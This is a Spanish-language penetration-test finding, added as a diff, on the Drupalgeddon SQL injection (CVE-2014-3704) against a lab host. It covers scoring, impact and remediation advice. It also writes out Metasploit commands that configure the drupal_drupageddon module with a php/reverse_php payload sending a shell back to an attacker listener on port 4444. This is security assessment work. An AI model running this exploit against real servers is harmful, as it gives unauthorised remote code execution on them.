@@ -1,0 +1,95 @@
+ID: PT-001
+Nombre: Drupalgeddon — SQL Injection en Drupal Core (CVE-2014-3704)
+Activo afectado: DC-1 (192.168.18.130:80)
+Servicio: Apache 2.2.22 + Drupal 7.22–7.26
+Severidad: Critical (CVSS 9.8)
+Vector CVSS: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+CVE: CVE-2014-3704
+CWE: CWE-89 (SQL Injection)
+
+Descripción técnica:
+Drupal 7.x anterior a 7.32 no neutraliza adecuadamente los parámetros
+de consulta en la API de base de datos (db_query), específicamente en
+la expansión de placeholders de tipo array. Un atacante no
+autenticado puede enviar una petición HTTP manipulada al formulario
+de login que resulta en inyección SQL, permitiendo:
+- Insertar un usuario administrador arbitrario.
+- Modificar la contraseña de un usuario existente (incluyendo admin).
+- Ejecutar comandos PHP en el contexto del servidor web.
+
+Evidencia de existencia:
+- Fingerprinting WhatWeb identificó "Drupal[7.22,7.23,7.24,7.25,7.26]".
+- Version está dentro del rango vulnerable (7.0 < 7.31).
+- Metasploit y Exploit-DB contienen módulos públicos para esta
+  vulnerabilidad.
+
+Estado: Confirmado — explotado exitosamente en nodo 06 (figura 19),
+obteniendo shell como www-data.
+
+Procedimiento de reproducción propuesto:
+1. Cargar el módulo exploit/multi/http/drupal_drupageddon en
+   Metasploit.
+2. Configurar RHOSTS=192.168.18.130, LHOST=192.168.18.129,
+   LPORT=4444, TARGETURI=/.
+3. Seleccionar payload PHP compatible (php/reverse_php por
+   compatibilidad con PHP 5.4).
+4. Ejecutar el exploit y verificar obtención de shell.
+
+
+Impacto técnico:
+Compromiso total del servidor web: ejecución remota de código como
+usuario www-data. Permite acceso al CMS, alteración de contenido,
+acceso a la base de datos y como punto de partida para escalada de
+privilegios.
+
+Impacto para la organización:
+Un atacante en la misma red puede comprometer el portal web sin
+autenticación previa. Se expone confidencialidad, integridad y
+disponibilidad del servidor y de los datos asociados.
+
+Recomendación:
+Actualizar Drupal a la versión 7.32 o superior (idealmente a la rama
+soportada más reciente). Si no es posible actualizar, aplicar el
+parche SA-CORE-2014-005 publicado por el equipo de seguridad de
+Drupal. Implementar WAF como mitigación temporal. Auditar logs
+históricos de la aplicación en busca de intentos de explotación.
+
+Referencias:
+- https://nvd.nist.gov/vuln/detail/CVE-2014-3704
+- https://www.drupal.org/SA-CORE-2014-005
+- https://www.exploit-db.com/exploits/34992
+
+
+Figuras 12a, 12b, 12c: Verificación de configuración del módulo drupal_drupageddon
+
+Comando ejecutado:
+$ msfconsole
+msf> use exploit/multi/http/drupal_drupageddon
+msf> set RHOSTS 192.168.18.130
+msf> set LHOST 192.168.18.129
+msf> set LPORT 4444
+msf> set PAYLOAD php/reverse_php
+msf> show options
+
+Figura 12a: Inicio de msfconsole
+
+
+Figura 12b: Configuración de parámetros del módulo
+
+
+Figura 12c: Verificación con show options
+
+
+
+Interpretación:
+Se configuró correctamente el módulo con:
+- RHOSTS = 192.168.18.130 (DC-1)
+- LHOST = 192.168.18.129 (Parrot, ens36)
+- LPORT = 4444 (puerto de escucha)
+- PAYLOAD = php/reverse_php (compatible con PHP 5.4)
+- TARGETURI = / (raíz del CMS)
+- Target = Drupal 7.0 - 7.31 (form-cache PHP injection method)
+
+Conclusión:
+Configuración validada. PT-001 pasa de estado "Posible" a "Confirmado
+en fase de explotación".
